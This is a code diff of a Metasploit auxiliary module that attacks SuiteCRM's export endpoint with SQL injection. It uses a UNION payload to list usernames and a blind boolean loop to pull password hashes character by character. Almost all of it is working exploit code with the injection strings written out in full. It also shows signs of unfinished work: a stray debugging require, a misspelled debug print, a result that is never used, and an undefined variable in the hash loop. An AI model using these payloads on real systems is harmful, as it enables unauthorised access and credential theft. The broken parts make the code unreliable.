@@ -10,6 +10,8 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::SQLi::BooleanBasedBlindMixin
 
+  require 'pry'
+
   def initialize(info = {})
     super(
       update_info(
@@ -115,103 +117,82 @@ class MetasploitModule < Msf::Auxiliary
     end
   end
 
-  def union_based_injection
+  def request(uid)
     res = send_request_cgi({
       'method' => 'POST',
       'keep_cookies' => true,
       'uri' => normalize_uri(target_uri.path, 'index.php?entryPoint=export'),
       'encode_params' => false,
       'vars_post' => {
-        'uid' => '\\,))+UNION+select+*+from+users;+--+&module=Accounts',
+        'uid' => uid,
         'module' => 'Accounts',
         'action' => 'index'
       }
     })
+    res
+  end
 
-    table = Rex::Text::Table.new('Header' => 'Users', 'Indent' => 1, 'Columns' => 'users')
+  # A valid uid is required to successfully exploit to the blind boolean sqli
+  # @return a string of the first UID returned by the server
+  def get_uid
+    # By sending a blank UID the server responds with the info for all users
+    uid = request('').body.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/)[0]
+    fail_with(Failure::NotFound, 'Unable to retrieve a uid from the server.') unless uid
+    uid
+  end
 
+  # This method uses UNION based injection to collect the user names from the users
+  # @return an array of usernames
+  def get_user_names
+    res = request('\\,))+UNION+select+*+from+users;+--+')
+    users = []
     res.body.each_line do |user|
       username = user.match(/"([\w\s]+)",/)
       next if username[1] == 'Name'
 
-      # binding.pry
-      create_credential({
-        workspace_id: myworkspace_id,
-        origin_type: :service,
-        module_fullname: fullname,
-        username: username[1],
-        service_name: 'SuiteCRM',
-        address: datastore['RHOSTS'],
-        port: datastore['RPORT'],
-        protocol: 'tcp',
-        status: Metasploit::Model::Login::Status::UNTRIED
-      })
-      # table.add_row(['users', username[1]])
       print_good("Found user: #{username[1]}")
+      users << username[1]
     end
-
-    # print_good(table.to_s)
+    users
   end
 
-  def dump_table_fields
-    @sqli = create_sqli(dbms: MySQLi::BooleanBasedBlind, opts: { hex_encode_strings: true }) do |payload|
-      res = send_request_cgi({
-        'method' => 'POST',
-        'keep_cookies' => true,
-        'uri' => normalize_uri(target_uri.path, 'index.php?entryPoint=export'),
-        'encode_params' => false,
-        'vars_post' => {
-          'uid' => "ad71889b-7922-cb54-124b-62bcc053419d,\\,))+AND+#{payload};+--+",
-          'module' => 'Accounts',
-          'action' => 'index'
-        }
-      })
-      # Every payload contains either a quote or a comma which doesn't work for this
-      fail_with Failure::Unreachable, 'Connection failed' unless res
-      res
+  # Use blind boolean SQL injection to determine the user_hashes of given usernames
+  def get_user_hashes(users)
+    hex_user_names = []
+    hash_length = 60
+    users.each do |user|
+      hex_user_names << user.each_byte.map { |b| b.to_s(16) }.join.prepend('0x')
     end
 
-    unless @sqli.test_vulnerable
-      print_bad("#{peer} - Testing of SQLi failed.  If this is time based, try increasing SqliDelay.")
-      return
-    end
-    print_good('Testing of SQLi passed. Target appears to be vulnerable')
-    columns = %w[users user_hash]
+    uid = get_uid
+    postive_response_length = request(uid).body.length
+    print("postive_response_length is #{postive_response_length}\n")
+    charset = '$abcdefghijklmnopqrstuvwxyz0123456789.ABCDEFGHIJKLMNOPQRSTUVWXYZ_@-./'
+    charset_bytes = charset.each_byte.map { |b| b.to_s(16) }
+    hex_user_names.each do |hex_user_name|
+      x = 0
+      hex_hash = ''
+      while x < hash_length
+        x += 1
+        charset_bytes.each do |byte|
+          payload = "#{uid},\\,))+AND+(select+(select+case+when+((select+user_hash+from+users+where+user_name=#{hex_user_name})+like+binary+0x#{hex_hash}#{byte}25)+then+1+else+2+end)=1);+--+"
+          body_length = request(payload).body.length
+          next unless body_length == postive_response_length
 
-    print_status('Enumerating Usernames and Password Hashes')
-    data = @sqli.dump_table_fields('users', columns, '', datastore['COUNT'])
-
-    table = Rex::Text::Table.new('Header' => 'users', 'Indent' => 1, 'Columns' => columns)
-
-    data.each do |user|
-      create_credential({
-        workspace_id: myworkspace_id,
-        origin_type: :service,
-        module_fullname: fullname,
-        username: user[0],
-        private_type: :nonreplayable_hash,
-        jtr_format: identify_hash(user[1]),
-        private_data: user[1],
-        service_name: 'SuiteCRM',
-        address: ip,
-        port: datastore['RPORT'],
-        protocol: 'tcp',
-        status: Metasploit::Model::Login::Status::UNTRIED
-      })
-      table << user
-    end
-
-    if table.rows.empty?
-      print_bad('The dump_tables_fields method was unsuccessful')
-    else
-      print_good(table.to_s)
+          hex_hash << byte
+          print("Got char: 0x#{byte}. Hash for user #{hex_user_name} is now 0x#{hex_hash}\r")
+          break
+        end
+      end
+      hash = [hex_hash].pack('H*')
+      print_good("User #{user} has user_hash: #{hash}")
     end
   end
 
   def run_host(_ip)
     authenticate unless @authenticated
     fail_with Failure::NoAccess, 'Unable to authenticate to SuiteCRM' unless @authenticated
-    dump_table_fields
-    union_based_injection
+    users = get_user_names
+    hashes = get_user_hashes(users)
   end
 end
